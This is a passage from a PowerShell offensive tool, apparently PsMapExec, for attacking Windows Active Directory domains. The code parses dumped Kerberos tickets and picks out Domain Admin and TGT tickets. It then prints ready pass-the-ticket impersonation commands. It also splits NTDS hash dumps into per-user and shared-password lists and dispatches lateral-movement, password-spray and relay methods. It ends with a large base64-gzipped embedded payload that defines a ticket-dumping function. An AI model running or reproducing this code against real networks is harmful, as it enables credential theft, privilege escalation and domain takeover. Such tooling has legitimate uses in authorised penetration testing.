        Start-sleep -Seconds "2"

        # Initialize DirectorySearcher
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher
        $Searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$domain")

        # Grab each candidate file for parsing based on the name ending in "KerbDump.txt"
        Get-ChildItem -Path $KerbDump -Filter "*KerbDump.txt" | 
        Where-Object { $_.Length -gt 0 } | 
        ForEach-Object {
            $Computer = $_.BaseName -split '-KerbDump' | Select-Object -First 1
            
            # Create the following flag to track output later
            $DisplayComputerName = $True

            # Create a directory in the name of the computer from which results are parsed from
            New-Item -ItemType "Directory" -Path $KerbDump -Name $Computer -Force | Out-Null
            $ComputerDirectory = "$KerbDump\$Computer"

            # Read the file content
            $FileContent = Get-Content -Path $_.FullName -Raw

            # Define regex pattern to match ticket details
            $pattern = "Service Name\s+:\s+(.+?)`r?`nEncryptionType\s+:\s+(.+?)`r?`nTicket Exp\s+:\s+(.+?)`r?`nServer Name\s+:\s+(.+?)`r?`nUserName\s+:\s+(.+?)`r?`nFlags\s+:\s+(.+?)`r?`nSession Key Type\s+:\s+(.+?)`r?`n"

            # Match and extract details
            $matches = [regex]::Matches($fileContent, $pattern)
            foreach ($match in $matches) {
                $data = @{
                    ServiceName    = $match.Groups[1].Value
                    EncryptionType = $match.Groups[2].Value
                    TicketExp      = $match.Groups[3].Value
                    ServerName     = $match.Groups[4].Value
                    UserName       = $match.Groups[5].Value
                    Flags          = $match.Groups[6].Value
                    SessionKeyType = $match.Groups[7].Value
                }

                # Transform the username into a more common format "DOMAIN\Username"
                $userNameParts = $data.UserName -split '@'
                $domainName = ($userNameParts[1] -split '\.')[0]  # Extracting domain name before the dot
                $DomainUserName = $userNameParts[0]

                # If the name contains $ then drop results from current loop. We do not want to see Computer account tickets in results
                if ($DomainUserName -match '\$$') { Continue }

                # Initialize notes variable
                $notes = ""

                # Track if the user is considered "Privileged". Used to help maintain tidy output by omitting some flags if present
                $PrivilegedUser = $false  

                if ($DomainUserName -in $DomainAdmins) { 
                    $notes += "[Domain Admin] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $EnterpriseAdmins) { 
                    $notes += "[Enterprise Admin] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $ServerOperators) { 
                    $notes += "[Server Operator] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $AccountOperators) { 
                    $notes += "[Account Operator] " 
                    $PrivilegedUser = $true
                }

                # Check AdminCount only if the user is not already identified as $PrivilegedUser
                if (-not $PrivilegedUser -and (AdminCount -UserName $DomainUserName -Searcher $Searcher)) {
                    $notes += "[AdminCount=1] "
                }

                # if a KRBTGT service is contained within the field, add the tag [TGT] to the results
                if ($data.ServiceName -match "krbtgt/") {
                    $notes += "[TGT] "
                }

                # Only present results if the note field has been populated. This means interesting results have been identified.
                if ($notes -ne "") {
                    if ($DisplayComputerName) {
                        Write-Host "`n`n-[$Computer]-`n"
                        $DisplayComputerName = $false
                    }
                    
                    Write-Host "User Name     : $($domainName.ToLower())\$($DomainUserName)"
                    Write-Host "Service Name  : $($data.ServiceName.ToLower())"
                    if ($data.ServiceName -match "krbtgt/") {} Else { Write-Host "Server Name   : $($data.ServerName.ToLower())" }
                    Write-Host "Ticket Expiry : $($data.TicketExp)"
                    Write-Host -NoNewline "Notes         : "
                    Write-Host -ForegroundColor Yellow -NoNewline "$notes"
                    Write-Host

                    # Logic to help pull just the ticket string
                    $ticketPattern = "-\[Ticket\]-`r?`n`r?`n(.+?)(?:`r?`n|$)"
                    $ticketStartPos = $match.Index + $match.Length
                    $ticketSearchText = $fileContent.Substring($ticketStartPos)
                    if ($ticketSearchText -match $ticketPattern) {
                        $ticketString = $Matches[1]
                        
                        # Replace '\' with '_' in ServiceName, Windows will not accept "/" as part of a file name
                        $data.ServiceName = $data.ServiceName.Replace('/', '@')
                        
                        # Form a path and file name made up of the ticket properties
                        $filePath = "$ComputerDirectory\$($data.UserName)-$($data.ServiceName).txt"
                        $ticketString | Out-File -FilePath $filePath -NoNewline -Encoding "ASCII"
                        
                        # Assign a random variable name to each ticket path to help produce tidy output to console for command generation
                        if ($notes -match "TGT") {
                            do {
                                $randomVarName = -join ((65..90) + (97..122) | Get-Random -Count 8 | % { [char]$_ })
                            } while (Get-Variable -Name $randomVarName -ErrorAction SilentlyContinue -Scope Global)

                            Set-Variable -Name $randomVarName -Value $filePath -Scope Global
                        
                            # A neat one-liner instruction for the user
                            Write-Host "Impersonate   : PsMapExec -Targets $Targets -Method $Method -Ticket `$$randomVarName"
                            Write-Host
                        
                        }
                        Else { Write-Host }
                    }
                }
            }

            # Move and rename the file after processing
            $newFileName = ".$Computer.FullDump.txt"
            Move-Item -Path $_.FullName -Destination "$ComputerDirectory\$newFileName" -Force
        }

        Write-Host "`n`n[*] " -NoNewline -ForegroundColor "Yellow"
        Write-Host "Only interesting results have  been shown. Computer accounts are omitted"
        Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
        Write-Host "Run with -NoParse to prevent parsing results in the future"
        Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
        Write-Host "Each ticket has been stored in $KerbDump"
    }

    ################################################################################################################
    ############################################## Function: Parse-NTDS ############################################
    ################################################################################################################

    Function Parse-NTDS {
        param (
            [string]$DirectoryPath
        )

        Write-Host "`n`nParsing Results" -ForegroundColor "Yellow"
        Start-sleep -Seconds "2"

        if ([string]::IsNullOrEmpty($DirectoryPath)) {
            Write-Host "Directory path is not specified or is empty." -ForegroundColor Red
            return
        }

        if (-not (Test-Path -Path $DirectoryPath)) {
            Write-Host "Directory at path '$DirectoryPath' does not exist." -ForegroundColor Red
            return
        }

        $currentTime = Get-Date -Format "yyyyMMddHHmmss"
        Get-ChildItem -Path $DirectoryPath -Filter "*-NTDS.txt" -File | ForEach-Object {
            $NTDSFile = $_.FullName
            $computerName = [IO.Path]::GetFileNameWithoutExtension($_.Name) -replace "-NTDS", ""
            $newDirectoryName = "${computerName}-${currentTime}"
            $newDirectoryPath = Join-Path $DirectoryPath $newDirectoryName

            if (-not (Test-Path -Path $newDirectoryPath)) {
                New-Item -Path $newDirectoryPath -ItemType "Directory" | Out-Null
            }

            $userHashes = @()
            $computerHashes = @()
            $identicalPasswordGroups = @{}
            $emptyPasswordUsers = @()
            $samHashes = @()

            $prevLine = ""
            Get-Content $NTDSFile | ForEach-Object {
                $line = $_
                $parts = $line -split ':'
                $user = $parts[0]
                $hash = $parts[3]

                if ($hash -eq '31d6cfe0d16ae931b73c59d7e0c089c0') {
                    $emptyPasswordUsers += $user
                }

                if ($user -like "*$*") {
                    $computerHashes += $line
                }
                else {
                    $userHashes += $line

                    if ($hash -ne $null) {
                        if (-not $identicalPasswordGroups.ContainsKey($hash)) {
                            $identicalPasswordGroups[$hash] = @()
                        }
                        $identicalPasswordGroups[$hash] += $user
                    }

                    # Check if the previous line and the current line do not have two "::" in a row
                    if (-not ($line -match ':::' -and $prevLine -match ':::')) {
                        $samHashes += $line
                    }
                }

                $prevLine = $line
            }

            $userHashes | Set-Content -Path (Join-Path $newDirectoryPath "UserHashes.txt")
            $computerHashes | Set-Content -Path (Join-Path $newDirectoryPath "ComputerHashes.txt")
            $emptyPasswordUsers | Set-Content -Path (Join-Path $newDirectoryPath "UsersWithEmptyPasswords.txt")

            $groupNumber = 1
            $groupedUsersContent = foreach ($group in $identicalPasswordGroups.GetEnumerator()) {
                if ($group.Value.Count -gt 1) {
                    $groupContent = "[Group $groupNumber]`n{0}" -f ($group.Value -join "`n")
                    $groupNumber++
                    $groupContent
                    Write-Output ""
                }
            }

            $groupedUsersContent | Set-Content -Path (Join-Path $newDirectoryPath "GroupedUsersWithIdenticalPasswords.txt")

            $newFileName = ".$computerName-NTDS-Full.txt"
            Move-Item -Path $NTDSFile -Destination (Join-Path $newDirectoryPath $newFileName) -Force

            # Write SAM hashes to SAMHashes.txt
            $samHashes | Set-Content -Path (Join-Path $newDirectoryPath "SAMHashes.txt")
        }

        Write-Output ""
        Write-host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-host "Parsed NTDS files stored in $newDirectoryPath"

        if ($Rainbow) {
            RainbowCheck -Module "NTDS" -RCFilePath (Join-Path $newDirectoryPath "UserHashes.txt")

        }

    }


    ################################################################################################################
    ################################################ Execute defined functions #####################################
    ################################################################################################################

    switch ($Method) {
        "All" { Method-All }
        "WinRM" { Method-WinRM }
        "MSSQL" { Method-MSSQL }
        "SMB" { Method-SMB }
        "WMI" { Method-WMIexec }
        "RDP" { Method-RDP }
        "GenRelayList" { GenRelayList }
        "SessionHunter" { Invoke-SessionHunter }
        "Spray" { Method-Spray }
        "VNC" { Method-VNC }
        
        default {
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Invalid Method specified"
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Specify either: WMI, WinRM, MSSQL, SMB, RDP, VNC, Spray, GenRelayList, SessionHunter"
            return
      
        }
    }

    if (!$NoParse) { if ($Module -eq "SAM") { Parse-SAM } }
    if (!$NoParse) { if ($Module -eq "eKeys") { Parse-eKeys } }
    if (!$NoParse) { if ($Module -eq "LogonPasswords") { Parse-LogonPasswords } }
    if (!$NoParse) { if ($Module -eq "KerbDump") { Parse-KerbDump } }
    if (!$NoParse) { if ($Module -eq "NTDS") { Parse-NTDS -DirectoryPath $NTDS } }

    RestoreTicket

    Write-Host ""
    
    $Time = (Get-Date).ToString("HH:mm:ss")
    Write-Host "Script Completed : $Time"
    $elapsedTime = (Get-Date) - $startTime
    Write-Host "Elapsed Time     : $elapsedTime"
    
    try { $searcher.Dispose() } Catch {}
    $CurrentUser = $null

}

$Global:rbs = @'
function Invoke-rTickets
{
    $a=New-Object IO.MemoryStream(,[Convert]::frOMbaSe64StrInG("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